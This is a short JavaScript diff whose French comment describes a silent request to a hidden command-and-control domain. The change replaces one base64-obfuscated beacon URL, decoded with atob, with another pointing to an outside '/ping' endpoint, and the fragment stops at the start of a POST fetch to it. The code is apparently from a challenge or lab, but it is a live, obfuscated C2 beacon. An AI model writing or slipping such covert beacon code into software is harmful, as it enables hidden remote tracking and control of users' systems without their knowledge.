@@ -1,5 +1,5 @@
-// Ce script fait une requête silencieuse vers un domaine C2 caché
-const beaconUrl = atob("aHR0cHM6Ly9jMmMuc2VjcmV0LXRyaGFja25vbi5vbmxpbmUvcGluZw==");
+// Ce script fait une requête silencieuse vers un domaine C2 caché (obfusqué)
+const beaconUrl = atob("aHR0cHM6Ly9jaGFsbHJlcG9kLm9ucmVuZGVyLmNvbS9waW5n");
 
 fetch(beaconUrl, {
   method: "POST",
